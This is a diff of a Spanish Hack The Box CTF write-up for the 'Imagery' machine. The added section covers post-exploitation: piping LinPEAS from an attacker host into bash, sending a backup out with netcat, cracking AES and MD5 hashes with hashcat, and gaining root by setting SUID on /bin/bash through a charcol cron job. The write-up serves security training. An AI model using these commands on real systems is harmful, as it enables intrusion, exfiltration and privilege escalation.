@@ -2,7 +2,7 @@
 layout: single
 title: Imagery - Hack The Box
 excerpt: "Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaremos una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador."
-date: 2026-02-19
+date: 2026-02-25
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-imagery/logo.png
@@ -165,11 +165,11 @@ Para validar el alcance del LFI, utilizamos el módulo **Intruder** de Burp Suit
 
 Encontramos que podemos descargar y ver los directorios estandares del sistema.
 
-- `/etc`: Confirmamos el Path Traversal al recuperar con éxito `/etc/grup`. Este archivo nos reveló la existencia de un usuario de sistema `web:x:1001:` (UID 1001), sugiriendo que la aplicación no corre bajo el contexto de `root`, sino de un usuario dedicado llamado **web**.
+- `/etc`: Confirmamos el Path Traversal al recuperar con éxito `/etc/group`. Este archivo nos reveló la existencia de un usuario de sistema `web:x:1001:` (UID 1001), sugiriendo que la aplicación no corre bajo el contexto de `root`, sino de un usuario dedicado llamado **web**.
   - `/etc/passwd` 
   - `/etc/hosts`
   - `/etc/crontab`
-  - `/etc/grup`
+  - `/etc/group`
 
   ![](/assets/images/htb-writeup-imagery/lfi-etc.png)
 
@@ -279,18 +279,7 @@ def apply_visual_transform():
     params = request_payload.get('params', {})
     if not image_id or not transform_type:
         return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
-    application_data = _load_data()
-    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
-    if not original_image:
-        return jsonify({'success': False, 'message': 'Image not found or unauthorized to transform.'}), 404
-    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
-    if not os.path.exists(original_filepath):
-        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
-    if original_image.get('actual_mimetype') not in ALLOWED_TRANSFORM_MIME_TYPES:
-        return jsonify({'success': False, 'message': f"Transformation not supported for '{original_image.get('actual_mimetype')}' files."}), 400
-    original_ext = original_image['filename'].rsplit('.', 1)[1].lower()
-    if original_ext not in ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM:
-        return jsonify({'success': False, 'message': f"Transformation not supported for {original_ext.upper()} files."}), 400
+    ...
     try:
         unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
         output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
@@ -318,33 +307,7 @@ def apply_visual_transform():
             value = str(params.get('value'))
             command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
             subprocess.run(command, capture_output=True, text=True, check=True)
-        else:
-            return jsonify({'success': False, 'message': 'Unsupported transformation type.'}), 400
-        new_image_id = str(uuid.uuid4())
-        new_image_entry = {
-            'id': new_image_id,
-            'filename': output_filename_in_db,
-            'url': f'/uploads/{output_filename_in_db}',
-            'title': f"Transformed: {original_image['title']}",
-            'description': f"Transformed from {original_image['title']} ({transform_type}).",
-            'timestamp': datetime.now().isoformat(),
-            'uploadedBy': session['username'],
-            'uploadedByDisplayId': session['displayId'],
-            'group': 'Transformed',
-            'type': 'transformed',
-            'original_id': original_image['id'],
-            'actual_mimetype': get_file_mimetype(output_filepath)
-        }
-        application_data['images'].append(new_image_entry)
-        if not any(coll['name'] == 'Transformed' for coll in application_data.get('image_collections', [])):
-            application_data.setdefault('image_collections', []).append({'name': 'Transformed'})
-        _save_data(application_data)
-        return jsonify({'success': True, 'message': 'Image transformed successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
-    except subprocess.CalledProcessError as e:
-        return jsonify({'success': False, 'message': f'Image transformation failed: {e.stderr.strip()}'}), 500
-    except Exception as e:
-        return jsonify({'success': False, 'message': f'An unexpected error occurred during transformation: {str(e)}'}), 500
-
+        ...
 ```
 
 Identificamos una vulnerabilidad crítica en el endpoint `/apply_visual_transform`. Aunque la función está restringida a usuarios con el atributo `is_testuser_account` (el cual confirmamos que posee el usuario **testuser@imagery.htb** en db.json), un administrador puede interactuar con ella si la lógica de sesión lo permite o si se suplanta a dicho usuario.
@@ -473,3 +436,193 @@ bash: no job control in this shell
 web@Imagery:~/web$ id
 uid=1001(web) gid=1001(web) groups=1001(web)
 ```
+
+# 3. Post Explotacion
+
+Procedemos con la fase de enumeración local para identificar vectores de escalada de privilegios. Para agilizar este proceso, utilizaremos la herramienta **LinPEAS**, un script automatizado que busca desconfiguraciones, archivos sensibles y vulnerabilidades en el kernel.
+
+En nuestra máquina de ataque, preparamos el binario y levantamos un servidor web temporal con Python para servir el archivo:
+
+```
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && python -m http.server 8000
+```
+
+Desde el servidor web, descargamos y ejecutamos el script directamente en memoria para minimizar la huella en disco:
+
+```
+curl -s http://{IP_ATACANTE}:8000/linpeas.sh | bash
+```
+
+Durante la enumeración, el script resalta un hallazgo crítico en el directorio `/var/backup``. Se trata de un archivo comprimido y cifrado mediante el algoritmo AES, el cual posee permisos de lectura para todos los usuarios:
+
+```
+web@Imagery:/var/backup$ ll
+total 22524
+drwxr-xr-x  2 root root     4096 Sep 22 18:56 ./
+drwxr-xr-x 14 root root     4096 Sep 22 18:56 ../
+-rw-rw-r--  1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
+```
+
+Enviamos el archivo a máquina local para realizar un análisis forense. Para ello, empleamos **Netcat** para establecer una transferencia de archivos punto a punto
+
+```
+nc -lvnp 8000 > backup_web.zip.aes
+```
+
+Desde el servidor web:
+
+```
+web@Imagery:/var/backup$ nc {IP_ATACANTE} 8000 < web_20250806_120723.zip.aes
+```
+
+## 3.1 Cracking AES Encryption
+
+Para determinar la naturaleza real del archivo, usaremos el comando `file`. Para identificar el tipo de archivo mediante el análisis de su cabecera y "números mágicos". 
+
+```
+file backup_web.zip.aes 
+backup_web.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
+```
+
+Revela que fue creado con **pyAesCrypt 6.1.1**, que es un modulo y script de línea de comandos de python diseñado para cifrar y desifar archivos algoritmo **AES-256 en modo CBC**. 
+
+
+Instalamos la utilidad [AES Crypt](https://www.aescrypt.com/download/) en nuestra máquina. Sin embargo, al intentar el descifrado, el sistema solicita una contraseña:
+
+```
+aescrypt
+Specify either encrypt (-e), decrypt (-d), or generate (-g) mode
+aescrypt -d backup_web.zip.aes
+Enter password: 
+```
+
+Para recuperar la clave, utilizaremos el script `aescrypt2hashcat.pl` del repositorio oficial de [Hashcat Tools](https://github.com/hashcat/hashcat/blob/master/tools). Este script extrae hash archivo `.aes`.
+
+```
+perl aescrypt2hashcat.pl backup_web.zip.aes  > backup_web_hash.txt
+
+cat backup_web_hash.txt 
+$aescrypt$1*98b981e1c146c078b5462f09618b1341*0dd95827498496b8c8ca334d99b13c28*10c6eeb86b1d71475fc5d52ed52d67c20bd945d53b9ac0940866bc8dfbba72c1*e042d41d09ac2726044d63af1276c49e2c8d5f9eb9da32e58bf36cf4f0ad9c6
+```
+
+Con el hash extraído, ejecutamos un ataque de fuerza bruta basado en diccionario y el modo específico para **AES Crypt** `(-m 22400)`:
+
+```
+hashcat -m 22400 backup_web_hash.txt /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
+```
+
+- **Password**: bestfriends
+
+## 3.2 Análisis del Backup y Extracción de Credenciales
+
+Tras obtener la contraseña, desciframos y descomprimimos el contenido para inspeccionar los archivos del proyecto:
+
+```
+aescrypt -d backup_web.zip.aes 
+Enter password:bestfriends
+Decrypting: backup_web.zip.aes
+```
+
+```
+unzip backup_web.zip
+cat backup_web.zip
+```
+
+Al explorar la estructura del backup, localizamos el archivo `db.json``, el cual actúa como base de datos de la aplicación y contiene información sensible de los usuarios:
+
+```json
+{
+    "users": [
+        ...
+        {
+            "username": "mark@imagery.htb",
+            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
+            "displayId": "868facaf",
+            "isAdmin": false,
+            "failed_login_attempts": 0,
+            "locked_until": null,
+            "isTestuser": false
+        }
+        ...
+    ]
+}
+```
+
+Con el hash obtenido, ejecutamos un ataque de fuerza bruta basado en diccionario y modo específico para **MD5** `(-m 0 )``
+
+```
+hashcat "01c3d2e5bdaf6134cec0a367cf53e535" -m 0 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
+```
+- **Password**: supersmash
+
+## 3.3 Escalacion de privilegios
+
+Tras comprometer la cuenta del usuario mark, procedemos a la enumeración del sistema en busca de vectores de escalada vertical.
+
+```
+mark@Imagery:~$ ls
+user.txt
+mark@Imagery:~$ cat user.txt 
+0f3184d1bc73c1b5a5ebb187e4b5a54c
+mark@Imagery:~$ sudo -l
+Matching Defaults entries for mark on Imagery:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User mark may run the following commands on Imagery:
+    (ALL) NOPASSWD: /usr/local/bin/charcol
+```
+
+El usuario puede ejecutar `/usr/local/bin/charcol`` con privilegios de **root** sin requerir contraseña.
+
+```
+mark@Imagery:~$ sudo charcol -R
+mark@Imagery:~$ sudo charcol shell
+[2026-02-25 19:55:32] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
+charcol>help
+ Automated Jobs (Cron):
+    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
+      Purpose: Add a new automated cron job managed by Charcol.
+      Verification:
+        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
+        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
+      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
+      Examples:
+        - Status 1 (encrypted app password), cron:
+          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
+          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
+          --name "Daily Docs Backup" --log-output <log_file_path>
+        - Status 2 (no app password), cron, unencrypted backup:
+          CHARCOL_NON_INTERACTIVE=true charcol auto add \
+          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
+          --name "Daily Docs Backup" --log-output <log_file_path>
+        - Status 2 (no app password), interactive:
+          auto add --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
+          --name "Daily Docs Backup" --log-output <log_file_path>
+          (will prompt for system password)
+```
+
+Al inspeccionar el manual de ayuda, indica explícitamente que la herramienta no valida la **seguridad de los comandos ejecutados**, lo que permite una **inyección de comandos arbitrarios** con los privilegios del binario (root).
+
+
+
+Haremos uso de la instruccion `auto`, para programar un job que ejecute un comando que nos devuelva una shell de bash en modo root.
+
+Para elevar privilegios, programaremos un schedule job que asigne el bit **SUID** al binario `/bin/bash`.
+
+```
+charcol> auto add --schedule "* * * * *" --command "chmod u+s /bin/bash" --name "pwn" --log-output "/home/mark/pwn.log"
+```
+
+Esto nos permitirá ejecutar una shell con el identificador del usuario root:
+
+```
+mark@Imagery:~$ /bin/bash -p
+bash-5.2# id
+uid=1002(mark) gid=1002(mark) euid=0(root) egid=0(root) groups=0(root),1002(mark)
+```
+
+**Hemos tomado control total del servidor.**
+
+**ADVERTENCIA**: El contenido de este **write-up** tiene fines exclusivamente educativos y éticos. El uso de estas técnicas en sistemas sin autorización previa es ilegal y está penado por la ley.
